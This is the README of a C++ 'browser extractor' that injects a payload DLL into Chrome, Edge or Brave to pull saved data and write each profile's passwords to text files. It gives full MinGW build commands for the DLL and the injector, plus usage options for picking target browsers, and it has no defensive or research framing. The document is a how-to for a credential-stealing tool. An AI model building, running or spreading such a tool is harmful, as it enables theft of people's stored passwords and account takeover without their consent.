# C++ Browser Extractor

This is a C++ port of the Rust browser extractor project.

## Project Structure

- `injector/`: The main executable that spawns the browser and injects the DLL.
- `proxydll/`: The DLL that is injected into the browser to extract data.

## Build Instructions (MinGW-w64)

### 1. Download Dependencies

Run the following script to download `nlohmann/json` and `sqlite3` amalgamation:

```bash
chmod +x download_deps.sh
./download_deps.sh
```

### 2. Build the Proxy DLL

```bash
# Compile sqlite3 separately
x86_64-w64-mingw32-gcc -O2 -c proxydll/src/sqlite3.c -o sqlite3.o

# Build the DLL
x86_64-w64-mingw32-g++ -O2 -shared proxydll/src/lib.cpp sqlite3.o -o payload.dll -lbcrypt -lcrypt32 -lole32 -loleaut32 -lshlwapi -static
```

### 3. Build the Injector

```bash
# Copy json.hpp to injector/src if not done by script
cp proxydll/src/json.hpp injector/src/

# Build the injector
x86_64-w64-mingw32-g++ -O2 injector/src/main.cpp -o injector.exe -lbcrypt -lcrypt32 -lole32 -loleaut32 -lshlwapi -static
```

## Usage

1. Build both components as described above.
2. Run `injector.exe`. It will look for `payload.dll` in the same directory.
3. Extracted data will be saved in folders named after the browsers (e.g., `Chrome/profile 1/password.txt`).

Options:
- `-b, --browser <name>`: Target a specific browser (chrome, edge, brave, all). Default is `all`.
